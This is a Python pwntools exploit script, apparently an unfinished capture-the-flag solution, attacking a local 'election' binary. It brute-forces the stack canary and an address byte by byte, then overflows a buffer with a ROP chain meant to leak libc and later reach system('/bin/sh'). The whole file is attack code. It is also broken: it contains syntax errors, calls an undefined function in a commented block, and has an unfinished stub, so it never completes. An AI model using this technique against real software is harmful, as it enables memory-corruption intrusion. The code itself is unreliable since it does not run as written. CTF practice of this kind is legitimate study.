from pwn import *

context.clear(arch='x86_64')

r = process('./election')
libc = ELF('./libc.so')
elf = ELF('./election')
# r = remote('', 10180)

# some token array
token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

offset_binsh = next(libc.search('/bin/sh'))
offset_system = libc.symbols['system']
offset_puts = elf.symbols['puts']
print('offset_binsh --> ', hex(offset_binsh))
print('offset_system --> ', hex(offset_system))
print('offset_puts --> ', hex(offset_puts))

# accumulate vote for enough space to write buffer
angel_vote = 0
def vote(total_vote):
    global angel_vote
    for cnt_vote in xrange(0, total_vote):
        r.sendlineafter('>', '1')
        r.sendlineafter('9]: ', '1')

        # Angelboy: Thank you!
        r.recvline()
        angel_vote += 1

    r.sendlineafter('>', '3')

def hack_vote_ret(canary):
    # 0x00000000000011a0 : pop r14 ; pop r15 ; ret: to clear 2 variables in main function
    p = ''
    pop_r14r15_ret = base + 0x11a0

    r.sendlineafter('>', '2')

    # The more votes.... say!
    r.sendlineafter('9]: ', '1')

    # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
    # To Angelboy:
    r.recv()
    #         (|msg 0xe0        | canary       | n idx      |   rbp         |   ret            |)
    r.sendline('\x00' * 0xe0 + p64(canary) + '\x00' * 0x10 + '\x00' * 0x08 + p64(pop_r14r15_ret))

    # Done!
    # quit voting --> SIGABRT occurred
    pause()
    r.sendlineafter('>', '3')
    print('finished hacking vote --> 'r.recv())

def hack_canary_ASLR():
    canary = ''
    canary_offset = 0xb8
    guess = 0

    buf = ''
    buf += 'A' * canary_offset

    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', buf)

    print('finished regiseter a token! ')
    while len(canary) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                canary += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1


    aslr = ''
    guess = 0

    print('canary --> ', hex(u64(canary)))
    while len(aslr) < 8:
        while guess <= 0xff:

            r.sendlineafter('>', '1')
            r.sendthen('Token: ', buf + chr(guess))

            check = r.recvline()
            if 'Invalid' not in check:
                aslr += chr(guess)
                buf += chr(guess)
                guess = 0

                # logout
                r.sendlineafter('>', '3')
                break

            guess += 1

    print('ASLR base --> ', hex(u64(aslr) - 0x1140))
    return u64(canary), u64(aslr)

# craft the rop for libc base
def rop_libc_base(canary, base):
    p = ''
    # 0x00000000000011a3 : pop rdi ; ret: to get rdi
    pop_rdi = 0x11a3

    # 0x201fe0 <__libc_start_main@GLIBC_2.2.5>, assign this to rdi
    libc_start_main = base + 0x201fe0
    p += p64(libc_start_main)

    # puts(libc_start_main)
    puts = base + offset_puts
    p += p64(puts)

    print('ROP for libc_base --> ', p)
    return p

def write_to_token(p):
    r.sendlineafter('>', '2')
    r.sendlineafter('Token: ', '\x00' * )
    return 0

def main():
    # brute force finding canary, and some ASLR-shit
    canary, base = hack_canary_ASLR()

    # vote for writing more buffer
    for i in xrange(0, 26):
        r.sendlineafter('>', '2')
        r.sendlineafter('token: ', token[i])
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token[i])

        if i < 25:
            vote(10)
        else:
            vote(5)

    # check vote result
    '''
    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', token[26])
    r.sendlineafter('>', '1')
    r.sendlineafter('Token: ', token[26])
    r.sendlineafter('>', '1')
    r.recv()
    print('\n check vote result')
    print(r.recv())
    r.sendline('1')
    r.recvline()

    buf_canary(rop_libc_base(canary, base))
    '''
    r.sendlineafter('>', '3')
    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', '\x00' * 0xb8)
    print('finished clearing token')

    # write the ROP of leaking libc in token
    p1 = rop_libc_base(canary, base)
    r.sendlineafter('>', '2')
    r.sendlineafter('token: ', p1)

    print('finished writing ROP of leaking libc in token')

    r.sendlineafter('>', '1')
    r.sendthen('Token: ', p1)

    hack_vote_ret(canary)

main()
r.sendlineafter('>', '3')
print('final')
r.close()